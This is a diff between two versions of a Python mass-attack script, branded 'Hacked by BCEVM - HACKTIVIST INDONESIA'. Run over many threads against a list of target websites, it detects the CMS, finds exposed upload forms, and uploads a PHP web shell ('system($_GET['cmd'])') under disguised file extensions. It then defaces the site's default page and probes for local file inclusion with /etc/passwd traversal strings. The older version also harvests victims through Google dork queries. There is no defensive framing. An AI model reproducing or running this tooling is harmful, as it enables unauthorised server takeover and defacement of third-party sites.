@@ -1,133 +1,114 @@
-import requests
-import threading
-from urllib.parse import urljoin, urlparse
-from bs4 import BeautifulSoup
-import random
-import time
+#!/usr/bin/env python3
 import os
 import re
+import time
+import random
+import requests
+from urllib.parse import urljoin, urlparse
+from bs4 import BeautifulSoup
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
-# Config
+# ====== Configuration ======
 THREADS = 10
-MAX_RETRIES = 2
 TIMEOUT = 10
+MAX_RETRIES = 2
 
-deface_file_path = "deface.html"
-deface_content = "<h1>Hacked by Bcevm-Hacktivist Indonesia</h1>"
-shell_code = "<?php echo 'Hacked by Bcevm-Hacktivist Indonesia'; system($_GET['cmd']); ?>"
-targets_file = "targets.txt"
-success_file = "success.txt"
-user_agents = [
+TARGETS_FILE = "targets.txt"
+SUCCESS_FILE = "success.txt"
+DEFACE_FILE = "deface.html"
+DEFAULT_DEFACE = "<h1>Hacked by BCEVM - HACKTIVIST INDONESIA</h1>"
+SHELL_CODE = "<?php echo 'Hacked by BCEVM - HACKTIVIST INDONESIA'; system($_GET['cmd']); ?>"
+
+USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
     "Mozilla/5.0 (X11; Linux x86_64)"
 ]
 
-# Common CMS paths and vulnerabilities
+UPLOAD_PATHS = [
+    'upload.php', 'admin/upload.php', 'filemanager/upload.php',
+    'assets/upload.php', 'inc/upload.php'
+]
+
 CMS_PATTERNS = {
-    'wordpress': [
-        ('/wp-admin/', 'WordPress Admin'),
-        ('/wp-content/plugins/', 'WordPress Plugins'),
-        ('/xmlrpc.php', 'WordPress XML-RPC')
-    ],
-    'joomla': [
-        ('/administrator/', 'Joomla Admin'),
-        ('/index.php?option=com_', 'Joomla Component')
-    ],
-    'drupal': [
-        ('/user/login', 'Drupal Login'),
-        ('/admin/', 'Drupal Admin')
-    ]
+    'wordpress': ['/wp-admin/', '/wp-content/plugins/', '/xmlrpc.php'],
+    'joomla': ['/administrator/', '/index.php?option=com_'],
+    'drupal': ['/user/login', '/admin/']
 }
 
+LFI_TESTS = [
+    '../../../../../../../../etc/passwd',
+    '....//....//....//....//....//etc/passwd',
+    '%2e%2e%2f%2e%2e%2fetc%2fpasswd'
+]
+
+# ====== Utility Functions ======
 def get_random_agent():
-    return random.choice(user_agents)
+    return random.choice(USER_AGENTS)
 
 def is_valid_url(url):
     try:
         result = urlparse(url)
         return all([result.scheme, result.netloc])
-    except ValueError:
+    except:
         return False
 
-def google_dork_search(query, pages=1):
-    results = set()
-    headers = {"User-Agent": get_random_agent()}
+def read_targets():
+    if os.path.exists(TARGETS_FILE):
+        with open(TARGETS_FILE, 'r') as f:
+            return [line.strip() for line in f if is_valid_url(line.strip())]
+    return []
 
-    for page in range(pages):
-        start = page * 10
-        url = f"https://www.google.com/search?q={query}&start={start}"
+def write_success(result):
+    with open(SUCCESS_FILE, 'a') as f:
+        f.write(result + "\n")
 
+def get_deface_content():
+    if os.path.exists(DEFACE_FILE):
+        with open(DEFACE_FILE, 'r') as f:
+            return f.read()
+    return DEFAULT_DEFACE
+
+# ====== Vulnerability Checkers ======
+def check_upload_url(base_url):
+    for path in UPLOAD_PATHS:
+        full_url = urljoin(base_url, path)
         try:
-            r = requests.get(url, headers=headers, timeout=TIMEOUT)
-            r.raise_for_status()
-
-            soup = BeautifulSoup(r.text, "html.parser")
-            for a in soup.find_all('a', href=True):
-                href = a['href']
-                if "/url?q=" in href:
-                    link = href.split("/url?q=")[1].split("&sa=")[0]
-                    if is_valid_url(link):
-                        results.add(link)
-        except Exception as e:
-            print(f"[!] Error dorking: {str(e)}")
-            time.sleep(random.uniform(2, 5))
-
-    return list(results)
-
-def check_upload_vulnerability(url):
-    upload_paths = [
-        'upload.php',
-        'admin/upload.php',
-        'filemanager/upload.php',
-        'assets/upload.php',
-        'inc/upload.php'
-    ]
-
-    for path in upload_paths:
-        test_url = urljoin(url, path)
-        try:
-            r = requests.get(test_url, headers={'User-Agent': get_random_agent()}, timeout=TIMEOUT)
+            r = requests.get(full_url, headers={'User-Agent': get_random_agent()}, timeout=TIMEOUT)
             if r.status_code == 200 and ('upload' in r.text.lower() or 'file' in r.text.lower()):
-                return test_url
+                return full_url
         except:
             continue
     return None
 
 def try_file_upload(upload_url):
-    filenames = [
-        "sayang.php",
-        "sayang.php.jpg",
-        "sayang.php;.jpg",
-        "sayang.phtml",
-        ".htaccess"
-    ]
-
-    for filename in filenames:
+    filenames = ["shell.php", "shell.php.jpg", "shell.phtml"]
+    for name in filenames:
+        files = {'file': (name, SHELL_CODE, 'application/x-php')}
         try:
-            files = {'file': (filename, shell_code, 'application/x-php')}
             r = requests.post(upload_url, files=files, timeout=TIMEOUT)
-
             if r.status_code in [200, 201]:
-                uploaded_path = urljoin(upload_url, f"../uploads/{filename}")
-                check = requests.get(uploaded_path, timeout=TIMEOUT)
+                possible_path = urljoin(upload_url, f"../uploads/{name}")
+                check = requests.get(possible_path, timeout=TIMEOUT)
                 if check.status_code == 200:
-                    return uploaded_path
+                    return possible_path
         except:
             continue
     return None
 
-def check_lfi_vulnerability(url):
-    lfi_tests = [
-        '../../../../../../../../etc/passwd',
-        '....//....//....//....//....//....//....//etc/passwd',
-        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
-    ]
+def try_deface(upload_url):
+    content = get_deface_content()
+    files = {'file': ('default.html', content, 'text/html')}
+    try:
+        r = requests.post(upload_url, files=files, timeout=TIMEOUT)
+        return r.status_code in [200, 201]
+    except:
+        return False
 
-    for test in lfi_tests:
+def check_lfi(url):
+    for test in LFI_TESTS:
+        test_url = f"{url}{'' if '?' in url else '?'}file={test}"
         try:
-            test_url = f"{url}{'' if '?' in url else '?'}file={test}"
             r = requests.get(test_url, timeout=TIMEOUT)
             if 'root:x:0:' in r.text:
                 return True
@@ -135,133 +116,55 @@ def check_lfi_vulnerability(url):
             continue
     return False
 
-def check_cms_vulnerabilities(url):
+def detect_cms(url):
     try:
         r = requests.get(url, headers={'User-Agent': get_random_agent()}, timeout=TIMEOUT)
-        content = r.text.lower()
-
-        for cms, patterns in CMS_PATTERNS.items():
-            if cms in content or any(p[0] in url.lower() for p in patterns):
-                print(f"[+] Detected {cms.capitalize()} at {url}")
-
-                for path, desc in patterns:
-                    vuln_url = urljoin(url, path)
-                    try:
-                        vr = requests.get(vuln_url, timeout=TIMEOUT)
-                        if vr.status_code == 200:
-                            print(f"  [+] Found {desc} at {vuln_url}")
-                    except:
-                        continue
-
+        html = r.text.lower()
+        for cms, paths in CMS_PATTERNS.items():
+            if cms in html or any(path in html for path in paths):
                 return cms
     except:
-        pass
-    return None
+        return None
 
-def auto_deface(url):
-    try:
-        files_to_deface = ['index.html', 'default.html']
-
-        if os.path.exists(deface_file_path):
-            with open(deface_file_path, 'r') as f:
-                content = f.read()
-        else:
-            content = deface_content
-
-        for fname in files_to_deface:
-            deface_url = urljoin(url, fname)
-            r = requests.put(deface_url, data=content, headers={"Content-Type": "text/html"})
-            if r.status_code in [200, 201, 204]:
-                print(f"[DEFACED] {deface_url}")
-                with open(success_file, 'a') as f:
-                    f.write(f"Defaced: {deface_url}\n")
-                return True
-    except Exception as e:
-        print(f"[!] Deface failed at {url}: {str(e)}")
-    return False
-
+# ====== Main Scanner ======
 def scan_target(url):
-    try:
-        print(f"[*] Scanning {url}")
+    print(f"[*] Scanning {url}")
+    cms = detect_cms(url)
 
-        cms = check_cms_vulnerabilities(url)
+    upload_url = check_upload_url(url)
+    if upload_url:
+        shell_path = try_file_upload(upload_url)
+        if shell_path:
+            print(f"[+] Shell uploaded at: {shell_path}")
+            write_success(f"Shell: {shell_path}")
+            if try_deface(upload_url):
+                print(f"[+] Defaced default.html at: {upload_url}")
+                write_success(f"Defaced: {upload_url}/default.html")
+            return
 
-        upload_url = check_upload_vulnerability(url)
-        if upload_url:
-            print(f"[+] Found upload form at {upload_url}")
-            shell_path = try_file_upload(upload_url)
-            if shell_path:
-                print(f"[SUCCESS] Shell uploaded: {shell_path}")
-                with open(success_file, 'a') as f:
-                    f.write(f"Shell: {shell_path}\n")
-                auto_deface(url)
-                return True
+    if check_lfi(url):
+        print(f"[+] LFI found at: {url}")
+        write_success(f"LFI: {url}")
+        return
 
-        if check_lfi_vulnerability(url):
-            print(f"[SUCCESS] LFI vulnerability found at {url}")
-            with open(success_file, 'a') as f:
-                f.write(f"LFI: {url}\n")
-            auto_deface(url)
-            return True
+    print(f"[-] No vuln found at: {url}")
 
-        auto_deface(url)
-        print(f"[-] No vulnerabilities found at {url}")
-        return False
-
-    except Exception as e:
-        print(f"[!] Error scanning {url}: {str(e)}")
-        return False
-
-def load_targets():
-    if os.path.exists(targets_file):
-        with open(targets_file, 'r') as f:
-            return [line.strip() for line in f if line.strip() and is_valid_url(line.strip())]
-    return []
-
-def save_targets(targets):
-    with open(targets_file, 'w') as f:
-        for target in targets:
-            f.write(f"{target}\n")
-
+# ====== Runner ======
 def main():
-    if not os.path.exists(targets_file):
-        open(targets_file, 'w').close()
-    if not os.path.exists(success_file):
-        open(success_file, 'w').close()
-
-    targets = load_targets()
+    targets = read_targets()
     if not targets:
-        print("[*] No targets found. Gathering targets from common vulnerabilities...")
-        common_vulns = [
-            'inurl:/upload.php',
-            'inurl:/wp-content/plugins',
-            'inurl:/admin/login.php',
-            'inurl:/filemanager',
-            'inurl:index.php?id=',
-            'inurl:page.php?page='
-        ]
-
-        for dork in common_vulns:
-            print(f"[*] Searching for: {dork}")
-            found = google_dork_search(dork)
-            targets.extend(found)
-            time.sleep(random.uniform(5, 10))
-
-        save_targets(targets)
-
-    print(f"[*] Starting scan with {len(targets)} targets")
+        print("[!] No valid targets found in targets.txt")
+        return
 
     with ThreadPoolExecutor(max_workers=THREADS) as executor:
         futures = {executor.submit(scan_target, url): url for url in targets}
-
         for future in as_completed(futures):
-            url = futures[future]
             try:
                 future.result()
             except Exception as e:
-                print(f"[!] Exception in {url}: {str(e)}")
+                print(f"[!] Error: {e}")
 
-    print("[*] Scan completed. Check success.txt for results.")
+    print("[*] Scan finished.")
 
 if __name__ == "__main__":
     main()
